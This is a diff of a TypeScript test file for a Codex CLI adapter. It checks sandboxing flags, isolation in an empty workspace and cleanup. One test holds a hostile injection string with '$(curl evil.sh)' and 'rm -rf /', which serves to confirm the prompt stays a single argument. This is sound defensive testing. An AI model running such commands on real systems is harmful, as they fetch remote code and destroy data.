@@ -1,9 +1,9 @@
-import { readFileSync } from "node:fs";
+import { existsSync, readdirSync, readFileSync } from "node:fs";
 import { describe, expect, it } from "vitest";
 import type { LlmCompletion, LlmEvent, Message } from "../../kernel/ports/llm.js";
 import { isProviderError } from "../../kernel/ports/model.js";
 import { codexArgs, codexLlm, codexModels } from "./codex.js";
-import type { CliEnded, CliRun } from "./run-cli.js";
+import type { CliEnded, CliOptions, CliRun, RunCli } from "./run-cli.js";
 
 // Fixture provenance: `fixtures/codex-auth-failure.jsonl` is verbatim stdout from a real
 // `codex exec --json --ephemeral --skip-git-repo-check -c web_search="disabled"` run of
@@ -25,17 +25,32 @@ function replaying(
   ended: CliEnded = { code: 0, error: null },
   stderr = "",
 ): {
-  readonly run: (b: string, a: readonly string[], s: AbortSignal) => CliRun;
-  readonly seen: { binary: string; args: readonly string[] }[];
+  readonly run: RunCli;
+  readonly seen: {
+    binary: string;
+    args: readonly string[];
+    options: CliOptions | undefined;
+    workspaceEntries: readonly string[] | undefined;
+  }[];
   readonly killed: () => number;
 } {
-  const seen: { binary: string; args: readonly string[] }[] = [];
+  const seen: {
+    binary: string;
+    args: readonly string[];
+    options: CliOptions | undefined;
+    workspaceEntries: readonly string[] | undefined;
+  }[] = [];
   let killed = 0;
   return {
     seen,
     killed: (): number => killed,
-    run: (binary, args): CliRun => {
-      seen.push({ binary, args });
+    run: (binary, args, _signal, options): CliRun => {
+      seen.push({
+        binary,
+        args,
+        options,
+        workspaceEntries: options?.cwd === undefined ? undefined : readdirSync(options.cwd),
+      });
       const bytes = new TextEncoder().encode(text);
       return {
         pid: 909,
@@ -78,11 +93,68 @@ async function drain(text: string, ended?: CliEnded, stderr?: string): Promise<L
 
 describe("codexArgs", () => {
   it("runs one ephemeral turn with web search off", () => {
-    expect(codexArgs(request())).toEqual([
+    expect(codexArgs(request(), "/private/slopify-codex-call")).toEqual([
       "exec",
       "--json",
       "--ephemeral",
+      "--ignore-user-config",
+      "--ignore-rules",
+      "--strict-config",
       "--skip-git-repo-check",
+      "--sandbox",
+      "read-only",
+      "--cd",
+      "/private/slopify-codex-call",
+      "--disable",
+      "shell_tool",
+      "--disable",
+      "unified_exec",
+      "--disable",
+      "code_mode_host",
+      "--disable",
+      "hooks",
+      "--disable",
+      "apps",
+      "--disable",
+      "plugins",
+      "--disable",
+      "remote_plugin",
+      "--disable",
+      "skill_search",
+      "--disable",
+      "multi_agent",
+      "--disable",
+      "computer_use",
+      "--disable",
+      "browser_use",
+      "--disable",
+      "image_generation",
+      "--disable",
+      "view_image",
+      "--disable",
+      "workspace_dependencies",
+      "-c",
+      "project_doc_max_bytes=0",
+      "-c",
+      "skills.include_instructions=false",
+      "-c",
+      "skills.bundled.enabled=false",
+      "-c",
+      "orchestrator.skills.enabled=false",
+      "-c",
+      "orchestrator.mcp.enabled=false",
+      "-c",
+      "include_permissions_instructions=false",
+      "-c",
+      "include_apps_instructions=false",
+      "-c",
+      "include_collaboration_mode_instructions=false",
+      "-c",
+      "include_environment_context=false",
+      "-c",
+      'shell_environment_policy.inherit="none"',
+      "-c",
+      expect.stringMatching(/^instructions=".*writing and research.*"$/),
       "-c",
       'web_search="disabled"',
       "-m",
@@ -93,22 +165,64 @@ describe("codexArgs", () => {
   });
 
   it("asks for the live mode when the caller wants grounding", () => {
-    expect(codexArgs(request({ webSearch: true }))).toContain('web_search="live"');
+    expect(codexArgs(request({ webSearch: true }), "/isolated")).toContain('web_search="live"');
   });
 
   it("leaves the model to the CLI's config when none was chosen", () => {
-    expect(codexArgs(request({ model: "" }))).not.toContain("-m");
+    expect(codexArgs(request({ model: "" }), "/isolated")).not.toContain("-m");
   });
 
   it("puts the prompt after a separator, as one argument, whatever is in it", () => {
     const prompt = '--help `id` $(curl evil.sh) ; rm -rf /\nsecond "line"';
-    const args = codexArgs(request({ messages: [{ role: "user", content: prompt }] }));
+    const args = codexArgs(request({ messages: [{ role: "user", content: prompt }] }), "/isolated");
     expect(args.at(-2)).toBe("--");
     expect(args.at(-1)).toBe(prompt);
   });
 });
 
 describe("codexLlm.complete", () => {
+  it("uses an empty private workspace instead of the launch repository, then removes it", async () => {
+    const fake = replaying(fixture("codex-success.jsonl"));
+    for await (const _event of codexLlm({ run: fake.run }).complete(request())) {
+      // drained
+    }
+
+    const call = fake.seen[0];
+    const directory = call?.options?.cwd;
+    expect(directory).toBeDefined();
+    expect(directory).not.toBe(process.cwd());
+    expect(call?.args.slice(call.args.indexOf("--cd"), call.args.indexOf("--cd") + 2)).toEqual([
+      "--cd",
+      directory,
+    ]);
+    expect(call?.workspaceEntries).toEqual([]);
+    expect(call?.options?.env?.PWD).toBe(directory);
+    expect(call?.options?.env?.INIT_CWD).toBeUndefined();
+    expect(call?.options?.env?.OLDPWD).toBeUndefined();
+    expect(call?.options?.env?.GIT_DIR).toBeUndefined();
+    expect(call?.options?.env?.GIT_WORK_TREE).toBeUndefined();
+    expect(existsSync(directory ?? "")).toBe(false);
+  });
+
+  it("removes its private workspace when spawning the CLI throws", async () => {
+    let directory = "";
+    const run: RunCli = (_binary, _args, _signal, options) => {
+      directory = options?.cwd ?? "";
+      expect(readdirSync(directory)).toEqual([]);
+      throw new Error("spawn setup failed");
+    };
+
+    await expect(
+      (async () => {
+        for await (const _event of codexLlm({ run }).complete(request())) {
+          // drained
+        }
+      })(),
+    ).rejects.toThrow("spawn setup failed");
+    expect(directory).not.toBe("");
+    expect(existsSync(directory)).toBe(false);
+  });
+
   it("replays a turn into its message and its token counts", async () => {
     expect(await drain(fixture("codex-success.jsonl"))).toEqual([
       {
